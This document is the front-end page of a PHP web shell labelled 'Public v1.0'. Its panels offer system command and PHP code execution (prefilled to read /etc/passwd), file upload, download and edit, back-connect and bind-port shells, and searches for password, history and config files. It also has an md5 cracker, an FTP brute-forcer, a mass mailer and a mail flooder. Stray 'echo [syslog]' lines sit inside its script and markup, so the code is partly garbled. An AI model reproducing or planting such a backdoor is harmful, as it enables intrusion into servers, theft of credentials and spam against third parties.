<b><font size=2 color=green><?php  echo testperl(); ?>
</font></b>
</td></tr>
<tr><td valign=top>
<b><font size=2 color=#999999><?php  echo date('H:i'); ?>
</font></b>
</td></tr>
<tr><td valign=top>
<b><font size=2 color=#999999><?php  echo date('d-m-Y'); ?>
</font></b>
</td></tr>
<tr><td valign=top>
<b><font size=2 color=#999999><?php  echo view_size(2345); ?>
</font></b>
</td></tr>
<tr><td valign=top>
<b><font size=2 color=#999999><?php  echo view_size(2345); ?>
</font></b>
</td></tr>
</table></td></tr>
</table>
</td></tr>
</table>
</td></tr>
<tr><td width=100% height=100% bgcolor='#333333' valign=top>
<table width=100%>
<tr><td valign=top align=center>
<table width=100% height=200 class='td1'>
<tr><td valign=top align=left width=50%>
<form action method=POST>
<input type=hidden name="type" value=5>
<textarea cols=80 rows=13 name="value" class='ta'>
<?php  echo htmlspecialchars(shell()); ?>
</textarea><?php  echo edit(); ?>
</form>
</td>



<td valign=top align=left width=10%>
<table width=100% height=100% class='td2'>
<form action method=POST><tr><td valign=top align=left height=40% style="border-bottom: 1px solid #000000;">
<b>.::System shell::.</b><br>
<input type=hidden name="type" value=2>
<center><input type=text name="value" size=35 class='ta'></center>
</ br><center><input type=submit value="Enter" style="border-top: 1px solid #333333;border-bottom: 1px solid #666666;border-right: 1px solid #666666;border-left: 1px solid #666666;background: #333333;font-weight:bold;"></center>
</td></tr></form>
<tr><td valign=top align=left>
<form action method=POST>
<table>
<tr><td>
<b>.::PHP-code::.</b>
</td><td align=right>
<input type=submit value="Run code" class='bt'>
<input type=hidden name="type" value=1>
</td></tr>
<tr><td colspan=2>
<textarea rows=5 cols=26 name="value" class='ta'><?php  echo 'readfile(\'/etc/passwd\');'; ?>
</textarea>
</td></tr>
</table></form>
</td></tr>
</table>
</td></tr>
</table>
<table>
<tr><td height=0></td></tr>
</table>
<table width=100% height=80 class='td1' valign=top>
<tr><td valign=top align=left width=50%>
<form action method=POST>
<table width=100% height=100% valign=top class='td2'>
<tr><td>
<b>.::PWD::.</b>
</td><td align=right>
<input type=submit class='bt' value="cd">
<input type=hidden name="type" value=3>
</td></tr>
<tr><td colspan=2>
<input type=text name="value" class='ta' size=71 value=<?php  echo pwd(); ?>
>
</td></tr>
</table></form></td><td valign=top align=left width=50%>
<form action method=POST>
<table width=100% height=100% valign=top class='td2'>
<tr><td>
<b>.::File Edit::.</b>
</td><td align=right>
<input type=submit class='bt' value="Edit">
<input type=hidden name="type" value=4>
</td></tr>
<tr><td colspan=2>
<input type=text name="value" class='ta' size=72 value=<?php  echo pwd(); ?>
>
</td></tr>
</table></form>
</td></tr>
<tr><td valign=top align=left width=50%>
<form action method=POST>
<table width=100% height=100% valign=top class='td2'>
<tr><td>
<b>.::Download::.</b>
</td><td align=right>
<input type=submit class='bt' value="Download">
<input type=hidden name="type" value=11>
</td></tr>
<tr><td colspan=2>
<input type=text name="value" class='ta' size=71 value=<?php  echo pwd(); ?>
>
</td></tr>
</table></form></td><td valign=top align=left width=50%>
<form enctype="multipart/form-data" action method=POST>
<table width=100% height=100% valign=top class='td2'>
<tr><td>
<b>.::Upload::.</b>
</td><td align=right colspan=3>
<input type=submit class='bt' value="Upload">
<input type=hidden name="type" value=6>
</td></tr>
<tr><td colspan=2>
<font size=2 color=#888888>New name:</b>
<input type=text size=15 name="newname" class=ta>
</td><td width=4></td><td colspan=2>
<input type=file name="userfile" size=28>
</td></tr>
</table></form>
<tr><td valign=top align=left width=50%>
<form action method=POST>
<table width=100% height=100% valign=top class='td2'>
<tr><td>
<b>.::Alias::.</b>
</td><td align=right>
<input type=submit class='bt' value="RUN">
<input type=hidden name="type" value=7>
</td></tr>
<tr><td colspan=2>
<select name='value' class='ta' width=200>
<option>find apahce config file</option>
<option>find access_log files</option>
<option>find error_log files</option>
<option>find suid files</option>
<option>find suid files in current dir</option>
<option>find sgid files</option>
<option>find sgid files in current dir</option>
<option>find config.inc.php files</option>
<option>find config.inc.php files in current dir</option>
<option>find config* files</option>
<option>find config* files in current dir</option>
<option>find all writable files</option>
<option>find all writable files in current dir</option>
<option>find all writable directories</option>
<option>find all writable directories in current dir</option>
<option>find all writable directories and files</option>
<option>find all writable directories and files in current dir</option>
<option>find all service.pwd files</option>
<option>find service.pwd files in current dir</option>
<option>find all .htpasswd files</option>
<option>find .htpasswd files in current dir</option>
<option>find all .bash_history files</option>
<option>find .bash_history files in current dir</option>
<option>find all .mysql_history files</option>
<option>find .mysql_history files in current dir</option>
<option>find all .fetchmailrc files</option>
<option>find .fetchmailrc files in current dir</option>
<option>list file attributes on a Linux second extended file system</option>
<option>show opened ports</option>
<option>---------------------------------------------------------------------------------------------------------</option>
</select>
</td></tr>
</table></form></td>
<script>
function base64Encode(str)
{
	var charBase64 = new Array(
		'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P',
		'Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f',
		'g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v',
		'w','x','y','z','0','1','2','3','4','5','6','7','8','9','+','/'
	);

	var out = "";
	var chr1, chr2, chr3;
	var enc1, enc2, enc3, enc4;
	var i = 0;

	var len = str.length;

	do
	{
		chr1 = str.charCodeAt(i++);
		chr2 = str.charCodeAt(i++);
		chr3 = str.charCodeAt(i++);


		enc1 = chr1 >> 2;
		enc2 = ((chr1 & 0x03) << 4) | (chr2 >> 4);
		enc3 = ((chr2 & 0x0F) << 2) | (chr3 >> 6);
		enc4 = chr3 & 0x3F;

		out += charBase64[enc1] + charBase64[enc2];

		if (isNaN(chr2))
  		{
			out += '==';
		}
  		else if (isNaN(chr3))
  		{
			out += charBase64[enc3] + '=';
		}
		else
		{
			out += charBase64[enc3] + charBase64[enc4];
		}
	}
	while (i < len);

	return out;
}

echo "[syslog]03\n";
function base64Decode(str)
{
	var indexBase64 = new Array(
		-1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1,
		-1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1,
		-1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,62, -1,-1,-1,63,
		52,53,54,55, 56,57,58,59, 60,61,-1,-1, -1,-1,-1,-1,
		-1, 0, 1, 2,  3, 4, 5, 6,  7, 8, 9,10, 11,12,13,14,
		15,16,17,18, 19,20,21,22, 23,24,25,-1, -1,-1,-1,-1,
		-1,26,27,28, 29,30,31,32, 33,34,35,36, 37,38,39,40,
		41,42,43,44, 45,46,47,48, 49,50,51,-1, -1,-1,-1,-1,
		-1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1,
		-1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1,
		-1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1,
		-1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1,
		-1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1,
		-1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1,
		-1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1,
		-1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1
	);

	var out = "";
	var chr1, chr2, chr3;
	var enc1, enc2, enc3, enc4;
	var i = 0;


	str = str.replace(/^[^a-zA-Z0-9\+\/\=]+|[^a-zA-Z0-9\+\/\=]+$/g,"")

	var len = str.length;

	do
	{
		enc1 = indexBase64[str.charCodeAt(i++)];
		enc2 = indexBase64[str.charCodeAt(i++)];
		enc3 = indexBase64[str.charCodeAt(i++)];
		enc4 = indexBase64[str.charCodeAt(i++)];

		chr1 = (enc1 << 2) | (enc2 >> 4);
		chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
		chr3 = ((enc3 & 3) << 6) | enc4;

		out += String.fromCharCode(chr1);

		if (enc3 != -1)
		{
			out += String.fromCharCode(chr2);
		}
		if (enc4 != -1)
		{
			out += String.fromCharCode(chr3);
		}
	}
	while (i < len);

	if (i != len)
	{
		new Error(BASE64_BROKEN);
		return "";
	}

	return out;
}

</script>
<td valign=top align=left width=50%>
<form action method=POST>
<table width=100% height=100% valign=top class='td2'>
<tr><td width=1%>
<b>.::Base64_encode::.</b>
</td><td align=right width=6%>
<input type=button value="encode" class='bt' onclick='t.value=base64Encode(t.value)'>	
</td>
<form action method=POST><td width=1%>
<b>.::Base64_decode::.</b>
</td><td align=right width=6%>
<input type=button value="decode" class='bt' onclick='n.value=base64Decode(n.value)'>	
</td></tr>
<tr><td colspan=2>
<input type=text name='t' class='ta' size=34>
</td><td colspan=2>
<input type=text name='n' class='ta' size=34>
</td></tr>
</table></form>
</td></tr>
</td></tr>
</table>
</td></tr><tr></tr><tr><td>
<table cellpadding=0 cellspacing=0><tr><td>
<table class='td1' width=226>
<tr><td width=100% class='td2'>
<form action method=POST>
<table cellpadding=0 cellspacing=0 width=90% border=0><tr><td colspan=3>
<b>.::Back Connect::.</b></td></tr>
<tr><td width=100% height=10 colspan=3></td></tr>
<tr><td width=25% align=right><font color=#888888 size=2><b>IP:</b></font></td>
<td width=5%></td>
<td width=100% align=right>
<input type=text class='ta' name='ip' size=15 value=<?php  echo $_SERVER['REMOTE_ADDR']; echo '[syslog]07
'; ?>
></td></tr>
<tr><td width=100% height=5 colspan=3></td></tr>
<tr><td width=25% align=right><font color=#888888 size=2>port:</font></td>
<td width=5%></td>
<td width=100% align=right>
<input type=text class='ta' name='port' size=10 value='5000'></td></tr>
<tr><td width=100% height=5 colspan=3></td></tr>
<tr><td width=25% align=right><font color=#888888 size=2>Method:</font></td>
<td width=5%></td>
<td width=100% align=right>
<select class='ta' name='method'>
<option>Perl</option>
<option>C#</option>
<option>---------------------</option>
</select></td></tr>
<tr><td width=100% height=5 colspan=3></td></tr>
<tr><td width=100% align=right colspan=3>
<input type=hidden name='type' value='12'>
<input type=submit value='Connect' class='bt'></form>
<tr><td width=100% height=5 colspan=3></td></tr>
</table>
</td></tr>
</table>
</td><td width=5></td><td>
<table class='td1' width=226>
<tr><td width=100% class='td2'>
<form action method=POST>
<table cellpadding=0 cellspacing=0 width=90% border=0><tr><td colspan=3>
<b>.::Bind port::.</b></td></tr>
<tr><td width=100% height=10 colspan=3></td></tr>
<tr><td width=25% align=right><font color=#888888 size=2><b>Port:</b></font></td>
<td width=5%></td>
<td width=100% align=right>
<input type=text class='ta' name='port' size=15 value='6000'></td></tr>
<tr><td width=100% height=5 colspan=3></td></tr>
<tr><td width=25% align=right><font color=#888888 size=2>pass:</font></td>
<td width=5%></td>
<td width=100% align=right>
<input type=text class='ta' name='pass' size=10 value='hshell'></td></tr>
<tr><td width=100% height=5 colspan=3></td></tr>
<tr><td width=25% align=right><font color=#888888 size=2>Method:</font></td>
<td width=5%></td>
<td width=100% align=right>
<select class='ta' name='method'>
<option>Perl</option>
<option>C#</option>
<option>---------------------</option>
</select></td></tr>
<tr><td width=100% height=5 colspan=3></td></tr>
<tr><td width=100% align=right colspan=3>
<input type=hidden name='type' value='12'>
<input type=submit value='Bind' class='bt'></form>
<tr><td width=100% height=5 colspan=3></td></tr>
</table>
</td></tr>
</table>
</td><td width=5></td><td width=50% height=141>
<table class='td1' width=100% height=100% valign=top><tr><td width=100% height=100% class='td2' valign=top>
<table cellpadding=0 cellspacing=0 width=95%><tr><td colspan=4>
<b>.::md5 bruter::.</b>
</td></tr><tr><td height=10></td></tr>
<tr><td width=20></td><td>
<font size=2 color="#888888" align=right><b>hash:</b></font></td><td width=5></td><td align=right>
<input type=text name='hash' class='ta' size=50>
</td></tr>
<tr><td height=5></td>
<tr><td width=20></td><td>
<font size=2 color="#888888" align=right>log_file:</font></td><td width=5></td><td align=right>
<input type=text name='log' class='ta' size=30 value='md5_log.txt'>
</td></tr>
<tr><td height=5></td>
<tr><td width=20></td><td>
<font size=2 color="#888888" align=right>dictionary_file:</font></td><td width=5></td><td align=right>
<input type=text name='dict' class='ta' size=30 value='md5_dict.txt'>
</td></tr>
<tr><td height=5></td>
<tr><td width=20></td><td>
</td><td width=5></td><td align=right>
<input type=submit class='bt' value='Start Brute'>
</td></tr>
</table>
</td></tr></table>
</td></tr></table>
<tr></tr><tr><td>
<table class='td1' width=100% height=310 valign=top align=left>
<form action method=POST>
<td valign=top align=left class='td2' width=33%>
<table cellpadding=0 cellspacing=0 width=100%>
<tr><td valign=top colspan=3 height=30>
<b>.::Spammer::.</b>
<tr><td width=25% align=right>
<font color=#888888 size=2><b>emails_file:</b></font>
</td><td width=65% align=right>
<input type=text name='elist' class='ta' size=17 value="emails.txt">
</td></tr><tr><td height=5></td></tr>
<tr><td width=25% align=right>
<font color=#888888 size=2><b>log_file:</b></font>
</td><td width=65% align=right>
<input type=text name='log' class='ta' size=17 value="mail_log.txt">
</td></tr>
<td height=5><td></tr>
<tr><td width=25% align=right>
<font color=#888888 size=2>From:</font>
</td><td width=65% align=right>
<input type=text name='from' class='ta' size=27>
</td></tr>
<td height=5><td></tr>
<tr><td width=25% align=right>
<font color=#888888 size=2>Subject:</font>
</td><td width=65% align=right>
<input type=text name='subject' class='ta' size=27>
</td></tr>
<td height=5><td></tr>
<tr><td width=25% align=right>
<font color=#888888 size=2>Message:</font>
</td><td width=65% align=right>
<textarea name='msg' class='ta' cols=20 rows=4></textarea>
</td></tr>
<td height=5><td></tr>
<tr><td width=25% align=right>
<font color=#888888 size=2>Check<sup>*</sup>:</font>
</td><td width=65% align=right>
<input type=text name='check' class='ta' size=27>
</td></tr>
<td height=5><td></tr>
<tr><td width=25% align=right>
</td><td width=65% align=right>
<input type=submit class='bt' value="Start">
<input type=hidden name='type' value=10>
</td></tr>
</table></form>
<form action method=POST>
<td valign=top align=left class='td2' width=33%>
<table cellpadding=0 cellspacing=0 width=100%>
<tr><td colspan=3 height=30 valign=top><b>.::FTP-Brute::.</b></td></tr>
<tr><td width=31% align=right>
<font color=#888888 size=2><b>Host:</b></font>
</td><td align=right>
<input type=text name='host' class='ta' size=28>
</td><td width=5%></td></tr><tr><td height=35 width=100% colspan=2></td></tr>
<tr><td align=right>
<font color=#888888 size=2>ftp_users file:</font>
</td><td align=right>
<input type=text name='users' class='ta' size=17 value="ftp_users.txt">
</td><td></td></tr>
<tr><td height=5 width=100% colspan=2></td></tr>
<tr><td align=right>
<font color=#888888 size=2>ftp_passwd file:</font>
</td><td align=right>
<input type=text name='passwd' class='ta' size=17 value="ftp_passwds.txt">
</td><td></td></tr>
<tr><td height=5 width=100% colspan=2></td></tr>
<tr><td align=right>
<font color=#888888 size=2>ftp_log file:</font>
</td><td align=right>
<input type=text name='log' class='ta' size=17 value="ftp_log.txt">
</td><td></td></tr>
<tr><td colspan=2 height=20></td></tr>
<tr><td colspan=2 align=right>
<input type=submit class='bt' value="Start Brute">
<input type=hidden name="type" value=9>
</td></tr>
</td></table></form>
<form action method=POST>
<td valign=top align=left class='td2' width=33%>
<table cellpadding=0 cellspacing=0 width=100%>
<tr><td valign=top colspan=3 height=30>
<b>.::Flooder::.</b>
<tr><td width=25% align=right>
<font color=#888888 size=2><b>log_file:</b></font>
</td><td width=65% align=right>
<input type=text name='log' class='ta' size=17 value="mflood_log.txt">
</td></tr>
<td height=5><td></tr>
<tr><td width=25% align=right>
<font color=#888888 size=2>Send to:</font>
</td><td width=65% align=right>
<input type=text name='to' class='ta' size=27>
</td></tr><tr>
<td height=5><td></tr>
<tr><td width=25% align=right>
<font color=#888888 size=2>From:</font>
</td><td width=65% align=right>
<input type=text name='from' class='ta' size=27>
</td></tr>
<td height=5><td></tr>
<tr><td width=25% align=right>
<font color=#888888 size=2>Subject:</font>
</td><td width=65% align=right>
<input type=text name='subject' class='ta' size=27>
</td></tr>
<td height=5><td></tr>
<tr><td width=25% align=right>
<font color=#888888 size=2>Message:</font>
</td><td width=65% align=right>
<textarea name='msg' class='ta' cols=20 rows=4></textarea>
</td></tr>
<td height=25><td></tr>
<tr><td width=25% align=right>
<font color=#888888 size=2>Amount:</font>
</td><td width=65% align=right>
<input type=text name='amount' class='ta' size=17>
</td></tr>
<td height=5><td></tr>
<tr><td width=25% align=right>
<font color=#888888 size=2>Check<sup>*</sup>:</font>
</td><td width=65% align=right>
<input type=text name='check' class='ta' size=27>
</td></tr>
<td height=5><td></tr>
<tr><td width=25% align=right>
</td><td width=65% align=right>
<input type=submit class='bt' value="Flood">
<input type=hidden name='type' value=10>
</td></tr>
</table></form>
</td></tr>
</table>
</td></tr>
</table>
</td></tr>
</table></center>
<center><font size=1 color=#444444>.:[Public v1.0]:.</font></center>
</body>
</html>
	
<!-- Coded by LoFFi & Ls01r //--><?php 